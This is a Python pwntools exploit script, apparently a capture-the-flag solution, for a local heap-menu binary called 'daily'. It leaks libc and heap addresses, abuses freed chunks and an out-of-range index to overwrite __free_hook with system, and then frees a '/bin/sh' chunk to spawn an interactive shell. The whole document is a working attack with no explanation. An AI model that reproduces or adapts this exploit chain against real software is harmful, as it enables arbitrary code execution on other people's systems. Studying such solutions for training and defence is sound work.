from pwn import *
p = process('./daily')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
def show():
    p.recvuntil('choice:')
    p.sendline('1')
    raw = p.recvuntil('===')[:-4]
    return raw

def add(length , content):
    p.recvuntil('choice:')
    p.sendline('2')
    p.recvuntil('daily:')
    p.sendline(str(length))
    p.recvuntil('daily\n')
    p.sendline(content)

def change(index , content):
    p.recvuntil('choice:')
    p.sendline('3')
    p.recvuntil('daily:')
    p.sendline(str(index))
    p.recvuntil('daily\n')
    p.sendline(content)

def remove(index):
    p.recvuntil('choice:')
    p.sendline('4')
    p.recvuntil('daily:')
    p.sendline(str(index))

for i in range(5):
    add(0x80 , '\x00' * 0x5f)
remove(1)
remove(3)
add(0x80 , '')
libc.address = u64(show().split('1 : ')[1][:6].ljust(8 , '\x00')) - 0x3c4b0a
change(1 , 'abcdefgh')
heap_base = u64(show().split('abcdefgh')[1].split('2 :')[0].ljust(8 , '\x00')) - 0x10a
free_hook = libc.symbols['__free_hook']
system_addr = libc.symbols['system']
success('libc_base => ' + hex(libc.address))
success('heap_base => ' + hex(heap_base))
success('free_hook => ' + hex(free_hook))
success('system_addr => ' + hex(system_addr))
remove(4)
remove(2)
remove(1)
remove(0)
add(0x30 , 'a' * 8 + p64(heap_base + 0x10))
offset = (heap_base - 0x602060) / 16 + 1
remove(offset)
add(0x41 , '\x00' * 0x40)
change(0 , p64(0x602068))
add(0x30 , '/bin/sh\x00')
gdb.attach(p)
add(0x30 , p64(free_hook))
gdb.attach(p)
change(1 , p64(system_addr))
remove(0)
p.interactive()
